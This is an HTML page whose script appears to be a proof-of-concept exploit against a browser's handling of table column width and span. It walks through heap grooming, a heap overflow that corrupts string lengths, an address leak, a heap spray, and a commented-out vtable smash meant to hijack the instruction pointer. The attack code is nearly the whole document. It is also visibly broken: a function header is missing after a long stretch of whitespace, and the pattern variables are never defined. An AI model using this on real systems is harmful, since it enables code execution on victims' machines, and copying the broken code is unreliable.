<html>
<body>
<div id="evil"></div>
<script>
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/**/
var free = "FREE"; // 8 bytes
while ( free.length < 500 ) free += free;

var string1 = "W00T";
while ( string1.length < 500 ) string1 += string1;

var string2 = "w00t";
while ( string2.length < 500 ) string2 += string2;

// create 3 heaps of 500 bytes
var array1 = new Array();
var array2 = new Array();
var array3 = new Array();

var div_container = document.getElementById("evil");
div_container.style.cssText = "display:none";

for (var i=0; i < 500; i+=2) {
    array1[i] = free.substring(0, (0x100-6)/2);     // 6 bytes to account for BSTR string header+terminator, divide by 2 cause unicode
    array2[i] = string1.substring(0, (0x100-6)/2);
    array3[i] = string2.substring(0, (0x100-6)/2);
    var obj = document.createElement("button");     // since we are filling 0, 2, 4, 6, 8... then automatically the button will be filled in the odd indices?
    div_container.appendChild(obj);
}

// heap looks like: [0x100 F.R.E.E.] [0x100 alloc W.0.0.T.] [0x100 alloc w.0.0.t.] [Button] [0x100 F.R.E.E.] [0x100 alloc W.0.0.T.] [0x100 alloc w.0.0.t.] ...

// We will free the F.R.E.E. blocks

// When we run the poc, we will occupy one of the F.R.E.E blocks and start to copy data into there and mess up the metadata of the BSTR string

for (var i=0; i<500; i+=2 ) {
    array1[i] = null;
    CollectGarbage();
}

alert("The heap is prepared :)")
/**/
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
</script>
<table style="table-layout:fixed" >
    <col id="132" width="41" span="9" >Doin some sussy stuff</col>
</table>
<script>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
	var junk = ""
	var shellcode = "";	
	var payload = "";
	
	while (junk.length < 0x372) junk += junkPattern;

	shellcode = headerPattern
	while (shellcode.length < 0x800) shellcode+=paddingPattern;

	while (payload.length < 0x100000) payload+=shellcode;

	payload = junk + payload

    var spray = new Array();	  
	for (i=0; i<100; i++) {
    	spray[i] = payload.substr(0, payload.length);   
  	}
  	alert("Heap sprayed :)")
}

function leak() {
    var obj_col = document.getElementById("132");
    obj_col.width = "42";
    obj_col.span = "20";
    alert("Heap overflow to change BSTR string properties...")
}

function find_leak() {
	var find = -1;
	var arr = -1
	for ( var i = 0; i < 500; i+=2 ) {
		if ( array2[i].length >  (0x100-6)/2 ) { // overflowed // 125, so until first w
			alert("We have found our string #2")
			find = i
			arr = 2
			break
		}
		if ( array3[i].length > (0x100-6)/2 ) { // overflowed
			alert("We have found our string #3")
			find = i
			arr = 3
			break
		}
	}
	if (find == -1) { alert("Something went wrong..."); return; }

	if (arr == 2) var leak_location = array2[find];
	else var leak_location = array3[find];	
	alert(leak_location.length);

/*
	var str_addr = leak_location.substring((0x100-6)/2+11,(0x100-6)/2+13);
	var first = str_addr.charCodeAt(0)
	var second = str_addr.charCodeAt(1) * 0x10000
	first += second
	first -= 0x1FAFA0
	alert(first.toString(16))
  */

	var str_addr = leak_location.substring((0x100-6)/2+5,(0x100-6)/2+7);
	var first = str_addr.charCodeAt(0)
	var second = str_addr.charCodeAt(1) * 0x10000
	first += second
	first -= 0x1FAE08
	alert(first.toString(16))

	spray();
}

function unicodeToChar(text) {
   return text.replace(/\\u[\dA-F]{4}/gi, 
          function (match) {
               return String.fromCharCode(parseInt(match.replace(/\\u/g, ''), 16));
          });
}

function smash_vtable_and_hijack_eip(){
    var evil_col = document.getElementById("132");
    evil_col.width = "2002110"; // have max value which would translate to 07ffffff, hence set to 07070707
    evil_col.span = "44";
}

//spray();
setTimeout("leak();",5000);
setTimeout("find_leak();",5000);
//setTimeout("smash_vtable_and_hijack_eip();",5000);
</script>
</body>
</html>
